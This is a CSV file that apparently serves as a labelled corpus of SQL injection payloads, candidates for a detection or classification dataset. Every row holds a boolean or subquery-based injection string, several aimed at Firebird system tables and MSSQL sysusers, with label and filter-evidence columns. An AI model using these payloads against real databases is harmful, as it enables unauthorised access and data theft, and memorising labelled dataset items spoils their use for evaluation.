user_corpus_source_row,payload_as_provided,original_label,prior_filter_evidence,source_type,boolean_family_confirmed,behavior_confirmed,root_id,y_complexity,notes
3654,"-2916""   )    )    or 4946  =  8232--",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3659,-7279  )   or 9898  =  9963 and   (  1481  =  1481,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3677,"-8698"" where 1990  =  1990 or   (  8459  =  8459  )  *4906--",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3692,"1   )    )    and elt  (  9288  =  6067,6067  )   and    (    (   1895  =  1895",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3701,1 and 9412  =  6877#,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3705,1  )   and 8417  =  5276#,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3713,-9311   )    )    or   (  5065  =  2572  )  *2572 and    (    (   1199  =  1199,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3719,"1'||  (  select 'odud' from dual where 2468  =  2468 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3727,"1"" where 9618  =  9618 and   (  3020  =  3020  )  *6703--",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3732,"1%' and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and '%'  =  '",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3738,"1'   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'msjw' like 'msjw",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3746,"1%"" and   (  3020  =  3020  )  *6703 and ""%""  =  """,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3747,"-8053"" where 5458  =  5458 or 9323  =  9323#",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3751,"1'+  (  select ouhd where 8905  =  8905 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   +'",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3767,1   )    )    and 7533  =  7533 and    (    (   8738  =  8738,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3768,"1  )   where 9432  =  9432 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3773,1%' and 9127  =  7687--,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3775,"1""   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3782,"1""  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""fbqy"" like ""fbqy",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3786,-4494 or 5291  =  4452,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3799,1%'   )    )    and 9198  =  9198--,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3800,-8301'   )    )     )   or   (  5708  =  5268  )  *5268 and    (    (     (  'hkha'  =  'hkha,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3804,1' and   (  3020  =  3020  )  *6703,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3815,"1 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3816,"-5190%"" or 8298  =  9306 and ""%""  =  """,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3828,"1'+  (  select 'aliz' where 5050  =  5050 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   +'",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3833,"1%'   )    )    and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3835,1'   )    )    as zqeg where 4729  =  4729 and   (  1098  =  9682  )  *9682--,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3836,"-9289   )    )    or make_set  (  5101  =  9919,9919  )   and    (    (   8977  =  8977",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3841,"1 where 8114  =  8114 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3850,"1  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3852,"1'||  (  select 'sned' where 4957  =  4957 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3853,-9212 or 1026  =  7967#,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3857,"1 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3861,"1'   )    )     )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3863,"1 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  # kkmw",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3874,"1   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  4744  =  4744",1,logical_numeric_comparison;logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3875,"1'   )    )    as ydbt where 8062  =  8062 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3878,1  )   and 2457  =  8146,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3886,1  )   as jvmv where 3857  =  3857 and   (  5717  =  6483  )  *6483--,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3928,-8187'   )    )     )   or 1698  =  2823#,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3929,"-3347%"" or 9323  =  9323#",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3940,-6518'   )    )    as vocx where 2539  =  2539 or   (  8652  =  2025  )  *2025--,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3946,"1""   )    )    and 5421  =  4804--",1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3947,1'||  (  select 'zzkx' where 3270  =  3270 and 2006  =  2006,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3952,1'  )   and   (  3020  =  3020  )  *6703 and   (  'rskq'  =  'rskq,1,logical_numeric_comparison,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3954,"1""   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""vjvz"" like ""vjvz",1,logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
3955,"1   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   5200  =  5200",1,logical_numeric_comparison;logical_subquery,user_uploaded_corpus_candidate,false,false,,unassigned,Source file provenance only; inspect before use; no automatic Y level or root mapping.
